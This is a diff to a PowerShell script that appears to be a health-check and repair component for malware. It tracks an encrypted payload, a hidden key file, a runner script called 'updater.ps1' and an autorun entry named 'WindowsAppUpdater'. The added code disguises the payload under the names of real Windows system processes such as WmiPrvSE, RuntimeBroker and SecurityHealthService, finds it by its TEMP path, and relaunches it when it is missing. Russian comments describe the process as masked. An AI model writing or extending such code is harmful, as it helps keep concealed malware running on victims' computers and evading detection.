@@ -9,7 +9,17 @@ $pFile = "$pDir\payload.enc"
 $kFile = "$kDir\.token"
 $rFile = "$rDir\updater.ps1"
 
-$pName = "pythonw"
+
+$fakeNames = @(
+    'SecurityHealthService',
+    'WmiPrvSE',
+    'SearchProtocolHost',
+    'RuntimeBroker',
+    'dllhost',
+    'conhost',
+    'sihost'
+)
+
 $aName = "WindowsAppUpdater"
 
 $mId = [System.BitConverter]::ToString(
@@ -55,19 +65,48 @@ function tFile {
     }
 }
 
+# Ищем замаскированный процесс (запущенный из TEMP)
 function tProc {
-    param([string]$pn)
-    $pr = Get-Process $pn -ErrorAction SilentlyContinue
-    if ($pr) {
-        $c = ($pr | Measure-Object).Count
-        $pi = @()
-        foreach ($p in $pr) {
-            $pi += @{ pid = $p.Id; startTime = $p.StartTime.ToString("o") }
+    $found = $false
+    $foundProcs = @()
+    
+    foreach ($name in $fakeNames) {
+        $procs = Get-Process $name -ErrorAction SilentlyContinue
+        if ($procs) {
+            foreach ($p in $procs) {
+                try {
+                    # Проверяем что процесс запущен из TEMP (наш замаскированный)
+                    $path = $p.Path
+                    if ($path -and $path -like "$env:TEMP\*") {
+                        $foundProcs += @{
+                            name = $p.ProcessName
+                            pid = $p.Id
+                            path = $path
+                            startTime = $p.StartTime.ToString("o")
+                        }
+                        $found = $true
+                    }
+                } catch {}
+            }
         }
-        lInfo "$pn process running" @{ count = $c; processes = $pi }
+    }
+    
+    if ($found) {
+        lInfo "Payload process running" @{ count = $foundProcs.Count; processes = $foundProcs }
         return $true
     } else {
-        lErr "$pn process not found"
+        # Fallback: проверяем pythonw на случай если запущен без маскировки
+        $pyProc = Get-Process pythonw -ErrorAction SilentlyContinue
+        if ($pyProc) {
+            $pi = @()
+            foreach ($p in $pyProc) {
+                $pi += @{ pid = $p.Id; name = "pythonw" }
+            }
+            lInfo "Python process running (unmasked)" @{ count = ($pyProc | Measure-Object).Count; processes = $pi }
+            return $true
+        }
+        
+        lErr "Payload process not found"
         return $false
     }
 }
@@ -167,7 +206,7 @@ function chk {
     $r.kf = tFile -p $kFile -n "Encryption key"
     $r.rf = tFile -p $rFile -n "Runner script"
     $r.py = tPy
-    $r.pr = tProc -pn $pName
+    $r.pr = tProc
     $r.ar = tRun -n $aName
     
     Write-Host "  [*] Analyzing results..." -ForegroundColor Yellow
@@ -182,8 +221,8 @@ function chk {
     
     if (-not $r.pr -and $r.rf -and $r.pf -and $r.kf) {
         if (startRun -rf $rFile) {
-            Start-Sleep -Seconds 3
-            $r.pr = tProc -pn $pName
+            Start-Sleep -Seconds 5
+            $r.pr = tProc
         }
         $needsRepair = $true
     }
